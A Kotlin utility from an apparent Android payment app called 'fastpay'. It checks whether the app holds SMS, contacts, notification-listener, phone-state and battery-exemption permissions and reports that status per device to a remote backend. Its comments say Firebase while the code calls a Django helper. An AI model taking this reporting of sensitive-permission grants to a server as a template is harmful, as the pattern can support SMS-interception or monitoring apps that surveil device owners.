package com.example.fast.util

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.PowerManager
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import com.example.fast.config.AppConfig
import com.example.fast.service.NotificationReceiver
import com.google.firebase.Firebase
import com.google.firebase.database.database
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import android.Manifest
import android.util.Log

/**
 * PermissionFirebaseSync
 * 
 * Syncs permission status to Firebase at fastpay/{deviceId}/permission
 * 
 * Structure:
 * fastpay/{deviceId}/permission: {
 *   sms: true/false,
 *   contacts: true/false,
 *   notification: true/false,
 *   battery: true/false,
 *   phone_state: true/false
 * }
 */
object PermissionFirebaseSync {
    private const val TAG = "PermissionFirebaseSync"
    private const val PREFS_NAME = "permission_sync_prefs"
    private const val KEY_LAST_HASH = "last_permission_hash"
    private const val KEY_LAST_SYNC = "last_permission_sync"
    private const val MIN_SYNC_INTERVAL_MS = 60_000L
    
    /**
     * Sync all permission status to Django
     */
    fun syncPermissionStatus(context: Context, deviceId: String) {
        val permissionStatus = getAllPermissionStatus(context)
        if (!shouldSyncPermissionStatus(context, permissionStatus)) {
            Log.d(TAG, "Permission status unchanged or throttled - skipping sync")
            return
        }
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Store in system_info under permissionStatus key
                val updates = mapOf(
                    "system_info" to mapOf(
                        "permissionStatus" to permissionStatus
                    )
                )
                DjangoApiHelper.patchDevice(deviceId, updates)
                Log.d(TAG, "Permission status synced to Django for $deviceId")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to sync permission status to Django", e)
            }
        }
    }

    private fun shouldSyncPermissionStatus(
        context: Context,
        status: Map<String, Boolean>
    ): Boolean {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val lastHash = prefs.getInt(KEY_LAST_HASH, 0)
        val lastSync = prefs.getLong(KEY_LAST_SYNC, 0L)
        val now = System.currentTimeMillis()
        val currentHash = status.toString().hashCode()

        if (currentHash == lastHash && now - lastSync < MIN_SYNC_INTERVAL_MS) {
            return false
        }

        prefs.edit()
            .putInt(KEY_LAST_HASH, currentHash)
            .putLong(KEY_LAST_SYNC, now)
            .apply()
        return true
    }
    
    /**
     * Get all permission status as a map
     * Made public for use in device-list sync
     */
    fun getAllPermissionStatus(context: Context): Map<String, Boolean> {
        return mapOf(
            "sms" to hasSmsPermissions(context),
            "contacts" to hasContactsPermission(context),
            "notification" to hasNotificationListenerPermission(context),
            "battery" to hasBatteryOptimizationExemption(context),
            "phone_state" to hasPhoneStatePermission(context)
        )
    }
    
    /**
     * Check if SMS permissions are granted (RECEIVE_SMS and READ_SMS)
     */
    private fun hasSmsPermissions(context: Context): Boolean {
        val receiveSms = ActivityCompat.checkSelfPermission(
            context,
            Manifest.permission.RECEIVE_SMS
        ) == PackageManager.PERMISSION_GRANTED
        
        val readSms = ActivityCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
        
        return receiveSms && readSms
    }
    
    /**
     * Check if contacts permission is granted
     */
    private fun hasContactsPermission(context: Context): Boolean {
        return ActivityCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_CONTACTS
        ) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Check if notification listener permission is granted
     */
    private fun hasNotificationListenerPermission(context: Context): Boolean {
        val component = ComponentName(
            context.packageName,
            NotificationReceiver::class.java.name
        )
        return NotificationManagerCompat.getEnabledListenerPackages(context)
            .contains(component.packageName)
    }
    
    /**
     * Check if battery optimization is disabled (app is exempt)
     */
    private fun hasBatteryOptimizationExemption(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return true // Not required for older Android versions
        }
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
        return powerManager?.isIgnoringBatteryOptimizations(context.packageName) ?: true
    }
    
    /**
     * Check if phone state permission is granted
     */
    private fun hasPhoneStatePermission(context: Context): Boolean {
        return ActivityCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_PHONE_STATE
        ) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Update a specific permission status in Django
     */
    fun updatePermissionStatus(context: Context, deviceId: String, permissionName: String, isGranted: Boolean) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Fetch current status or just send the update
                // Since we don't have the full map, we can just sync all again
                syncPermissionStatus(context, deviceId)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to update $permissionName status", e)
            }
        }
    }
}
